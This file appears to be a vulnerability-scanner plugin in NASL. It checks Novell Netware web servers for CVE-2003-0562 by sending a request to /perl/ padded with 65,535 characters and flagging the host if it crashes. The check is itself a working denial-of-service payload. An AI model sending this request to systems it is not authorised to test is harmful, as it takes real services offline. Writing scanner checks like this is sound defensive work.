if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11827" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 8251 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2003-0562" );
	script_name( "Netware Perl CGI overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2003 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Novell_Netware/banner" );
	script_exclude_keys( "www/too_long_url_crash" );
	script_xref( name: "URL", value: "http://support.novell.com/servlet/tidfinder/2966549" );
	script_tag( name: "solution", value: "Upgrade your web server." );
	script_tag( name: "summary", value: "The remote web server crashes when it receives a too long URL
  for the Perl handler." );
	script_tag( name: "impact", value: "It might be possible to make it execute arbitrary code through this flaw." );
	script_tag( name: "affected", value: "Netware 5.1 SP6, Netware 6." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Novell" ) || !ContainsString( banner, "Netware" )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
req = NASLString( "/perl/", crap( 65535 ) );
req = http_get( item: req, port: port );
send( socket: soc, data: req );
r = http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port, retry: 4 )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

